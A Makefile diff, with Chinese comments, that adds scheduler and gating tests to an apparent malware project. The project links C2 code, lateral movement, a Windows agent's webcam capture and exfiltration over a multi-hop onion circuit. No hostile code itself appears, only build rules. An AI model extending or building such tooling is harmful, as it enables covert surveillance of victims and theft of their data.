@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/test_sched $(BUILD)/test_sched_gate
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -51,6 +51,19 @@ $(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
 $(BUILD)/exfil_link.o: src/exfil_link.c include/exfil_link.h include/exfil.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# 采集调度层：触发模式 / 速率治理 / 去重。纯决策，不采集不发包，
+# 故不链接任何密码学与上游库 —— 可独立编译。
+$(BUILD)/sched.o: src/sched.c include/exfil_sched.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+$(BUILD)/test_sched: tests/test_sched.c $(BUILD)/sched.o
+	$(CC) $(CFLAGS) $< $(BUILD)/sched.o -o $@
+
+# 调度层与真实回传链路的集成对照：无限速 vs 调度门控，实测线上信元/字节
+$(BUILD)/test_sched_gate: tests/test_sched_gate.c $(BUILD)/sched.o $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
+	$(CC) $(CFLAGS) $< $(BUILD)/sched.o $(BUILD)/exfil.o -o $@ \
+	  $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
+
 # 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
 $(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
@@ -68,10 +81,12 @@ $(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(L
 $(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
+	./$(BUILD)/test_sched
+	./$(BUILD)/test_sched_gate
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
